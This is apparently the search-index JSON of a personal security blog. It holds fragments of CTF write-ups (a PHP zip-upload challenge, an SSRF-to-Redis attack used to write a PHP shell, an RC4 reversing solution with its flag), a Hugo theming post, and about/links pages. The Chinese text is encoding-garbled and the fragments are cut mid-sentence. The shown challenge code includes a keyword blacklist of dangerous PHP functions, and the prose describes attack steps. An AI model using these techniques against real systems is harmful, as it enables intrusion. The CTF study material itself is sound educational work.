session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404é¡µé¢ å‚è€ƒ [FSCTF 2023]ç­¾åˆ°plus å°è¯•æ‰“ä¸‹ phpï¼œ= 7 . 4 . 21 development serveræºç æ³„éœ²ï¼Œå…¶å®éšä¾¿è®¿é—®ä¸€ä¸‹å°±å‡ºæºç äº† unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"å‰è¨€\ræ¯”èµ›æ—¶é—´æœ‰ç‚¹é˜´é—´ï¼Œé¢˜ç›®çš„è¯å…¨æ˜¯äºŒè¿›åˆ¶ï¼Œèƒ½çœ‹çš„é¢˜å°±åªæœ‰ä¸‰é“ï¼ŒJavaå¬è¯´æ˜¯ä¸ª1dayï¼Œæ‘†äº† ","date":"2025-01-07","objectID":"/posts/6c39531/:1:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"é’“é±¼é‚®ä»¶\rè®°äº‹æœ¬æ‰“å¼€æ˜¯ä¸€å¤§ä¸²base64ç¼–ç ï¼Œè§£ç åæ˜¯ä¸ªzipï¼Œä¸‹è½½ä¸‹æ¥çˆ†ç ´å¯†ç ï¼Œæœ€åå¯†ç ä¸º 20001111ï¼Œå¾—åˆ°ä¸ªexeï¼Œæ‹¿åˆ°å¥‡å®‰ä¿¡åœ¨çº¿æ²™ç®±å‡º å°è¯•åå‘ç°æ˜¯222.218.218.218é‚£ä¸ªï¼Œmd5ä¸€ä¸‹å°±è¡Œ ","date":"2025-01-07","objectID":"/posts/6c39531/:2:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"CachedVisitor\rmain.lua local function read_file(filename) local file = io.open(filename, \"r\") if not file then print(\"Error: Could not open file \" .. filename) return nil end local content = file:read(\"*a\") file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\"##LUA_START##(.-)##LUA_END##\") if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\"Error executing Lua code: \", result) end else print(\"Error loading Lua code: \", err) end else print(\"Error: No valid Lua code block found.\") end end local function main() local filename = \"/scripts/visit.script\" local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() æœ€åæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œ/scripts/visit.scriptçš„ä½œç”¨æ˜¯ä»å¤–éƒ¨ URL è·å–æ•°æ®å¹¶å°†å…¶ç¼“å­˜åˆ° Redis ä¸­ï¼Œä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ssrfæ‰“redisï¼Œåˆšå¼€å§‹èµ°åäº†ï¼Œä»¥ä¸ºæ˜¯æ‰“ä¸ªcve å¯ä»¥ç›´æ¥æŠŠ/scripts/visit.scriptè¦†ç›–æˆæ‰§è¡Œ/readflagå¹¶è·å–å›æ˜¾ï¼Œç”¨dictåè®®è€æ˜¯ä¼šæŠ¥å¼•å·æœ‰é—®é¢˜ï¼Œç”¨gopheråè®®æ‰“ è¿™é‡Œé€‰æ‹©çš„æ˜¯phpshellï¼Œé»˜è®¤ç”Ÿæˆçš„æ˜¯shell.phpï¼Œè§£ç æ”¹ä¸€ä¸‹æ–‡ä»¶åå’Œé•¿åº¦ æœ€åç¼–ç çš„è¯è¿˜æ˜¯å»ºè®®ç”¨bpç›´æ¥ç¼–ç ï¼Œå…¶ä»–çš„æ€»ä¼šå‡ºç‚¹é—®é¢˜ æ¥ä¸‹æ¥æ˜¯äºŒè¿›åˆ¶çˆ·çš„wp ","date":"2025-01-07","objectID":"/posts/6c39531/:3:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"donntyousee\ræ‰“å¼€æ–‡ä»¶é€æ­¥è°ƒè¯• è¿™é‡Œé¢æ˜¯call-retå‹èŠ±æŒ‡ä»¤ï¼Œæ‰€ä»¥æŠŠç›¸å…³å†…å®¹nopæ‰ï¼Œå¤§è‡´æ ¼å¼æ˜¯ï¼š push rax; call loop; loop: xxxxx; ret; pop rax; æ¯ä¸ªç›¸å…³çš„å‡½æ•°éƒ½æœ‰è¿™ä¸ªï¼Œå¯ä»¥å…¨éƒ¨nopæ‰ è°ƒç”¨äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«éƒ½æ˜¯call r8ï¼Œåªæœ‰åŠ¨æ€è°ƒè¯• ç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡ŒSboxçš„åˆå§‹åŒ–ï¼Œç”¨çš„æ•°æ®æ˜¯byte_5C5110ï¼Œè¿™ä¸ªæ˜¯key ç¬¬äºŒä¸ªå‡½æ•°æ˜¯æ‰§è¡ŒåŠ å¯†ï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªé­”æ”¹RC4ï¼Œå¯ä»¥ç›´æ¥é€†å‘ã€‚ ç»§ç»­å¾€åè°ƒè¯• è¿™é‡Œè¿›è¡Œäº†æ¯”è¾ƒï¼Œsub_4E4060æ˜¯è¾“å‡ºæ­£ç¡®ä¸å¦ï¼Œæ‰€ä»¥çœ‹v7çš„ç»ˆå€¼ï¼Œç›´æ¥è§£å¯†å³å¯ key:921C2B1FBAFBA2FF07697D77188C data:25 cd 54 af 51 1c 58 d3 a8 4b 4f 56 ec 83 5d d4 f6 47 4a 6f e0 73 b0 a5 a8 c3 17 81 5e 2b f4 f6 71 ea 2f ff a8 63 99 57 flag:dart{y0UD0ntL4cKg0oD3y34T0F1nDTh3B4aUtY} ","date":"2025-01-07","objectID":"/posts/6c39531/:4:0","tags":["CTF"],"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›åˆèµ›2025éƒ¨åˆ†wp","uri":"/posts/6c39531/"},{"categories":["æ‚è®°"],"content":"å‰ç½®\rä¸‹è½½å¥½Gitã€Go å’Œ Dart Sassã€hugo Dart Sassæˆ‘è¿™ç”¨çš„npmä¸‹çš„ npm install -g sass sass --version //éªŒè¯å®‰è£… hugoä¸‹è½½ï¼šhttps://github.com/gohugoio/hugo/releasesï¼ˆä¸‹è½½extendæ‹“å±•ç‰ˆçš„ï¼Œæ–¹ä¾¿è‡ªå®šä¹‰åŠ ä¸œè¥¿ï¼Œè®°å¾—åŠ ç¯å¢ƒå˜é‡ï¼‰ å…¶ä»–æˆ‘éƒ½é…å¥½äº†ï¼Œä¸å¤šè¯´ ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"åšå®¢é…ç½®\rç„¶åæŒ‰ç…§è¿™ä¸ªæ¥å§ï¼š https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ è¿™é‡Œechoæ—¶è¦å»æ‰åŒå¼•å·ï¼Œå…¶ä»–çš„ä¸å¤šè¯´ ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"ç¾åŒ–è®°å½•ï¼ˆæŒç»­æ›´æ–°ingï¼‰\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"2025.2.28\ræœ‰äººå‚¬æˆ‘åŠ å‹é“¾ï¼Œäºæ˜¯å¼„ä¸‹å‹é“¾ï¼Œæ„Ÿè§‰ loveit ä¸»é¢˜å’Œ fixit ä¸»é¢˜å·®ä¸å¤šï¼ŒæŒ‰ç…§æ–‡ç« ï¼šhttps://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ æ¥å°±å¥½ï¼Œåªéœ€è¦æ³¨æ„ä¸‹åœ¨ä¿®æ”¹FixIt/assets/css/_page/çš„_single.scssæ—¶å¼•å…¥çš„è¡Œåº”è¯¥ä¸º @import \"../_partials/_single/friend\"; fixit çš„ç›®å½•æ¯” loveit çš„ç›®å½•å°‘äº†ä¸ª s ï¼Œå…¶ä»–çš„è¯å« ai æ”¹äº†ä¸ªé¢œè‰²ï¼ŒæŠŠæ—‹è½¬å»æ‰äº†ï¼Œå†åŠ äº†ä¸ªå¾®å¾®æ”¾å¤§çš„åŠ¨ç”»ï¼Œæˆ‘çš„ friend.scss // ===== å˜é‡å®šä¹‰ ===== $shadow-green: rgba(50, 205, 50, 0.3); // ç»¿è‰²é˜´å½± $hover-green: rgba(144, 238, 144, 0.3); // æ‚¬åœèƒŒæ™¯è‰² $hover-scale: 1.02; // æ‚¬åœæ”¾å¤§æ¯”ä¾‹ $transition-time: 0.3s; // è¿‡æ¸¡åŠ¨ç”»æ—¶é—´ // ===== åŸºç¡€æ ·å¼ ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== å¸ƒå±€å±æ€§ ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== è§†è§‰æ•ˆæœ ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== è¿‡æ¸¡åŠ¨ç”» ===== transition: all $transition-time ease-in-out; // ===== æ‚¬åœçŠ¶æ€ ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // åŠ å¼ºé˜´å½± } // ===== å·¦ä¾§å¤´åƒåŒºåŸŸ ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== å³ä¾§æ–‡å­—åŒºåŸŸ ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== æ–‡å­—æ§åˆ¶ ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== æ‰‹æœºç«¯é€‚é… ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // å•åˆ—æ˜¾ç¤º \u0026:hover { transform: scale(1.01); // ç¼©å°æ”¾å¤§æ¯”ä¾‹ } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":null,"content":"IntroductionğŸ‘¨â€ğŸ’»\rWeb/Misc@D0g3 æƒ³å­¦æ¸—é€ï¼Œæƒ³å­¦Java ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Contact meâ˜ï¸\rQQï¼šMjg2OTg3Mzk1OQ== Githubï¼šhttps://github.com/6s6-630 ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"D0g3\rgaorenyusi\rWeb\rYuy0ung\rWeb\u0026Misc\rfupanc\rWeb\rVVkladg0\rWeb\rtammy66\rWeb\rLitsasuk\rWeb\rpRism\rRe\r","date":"0001-01-01","objectID":"/links/:0:1","tags":null,"title":"Links","uri":"/links/"}]